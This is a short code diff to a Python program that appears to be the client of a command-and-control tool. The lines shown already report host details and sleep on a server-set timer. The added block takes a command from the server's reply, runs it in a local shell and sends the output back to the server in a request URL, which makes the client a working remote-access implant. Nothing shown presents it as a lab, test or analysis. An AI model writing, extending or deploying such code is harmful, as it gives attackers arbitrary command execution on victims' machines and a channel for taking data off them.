@@ -557,6 +557,14 @@ processor = {platform.processor()}"""))
                 data = json.loads(r[1])
             except json.JSONDecodeError:
                 print("Failed to decode JSON response")
+            if "command" in data:
+                command = data["command"]
+                cid = data["command_uuid"]
+                print(f"Executing command: {command}")
+                output = subprocess.getoutput(command)
+                url = f"http://{address[0]}:{address[1]}/response?id={id}&cid={cid}&output={output}"
+                r = self.get_request(url)
+                print(r)
             if "timer" in data:
                 timer = data["timer"]
                 print(f"Sleeping for {timer} seconds")
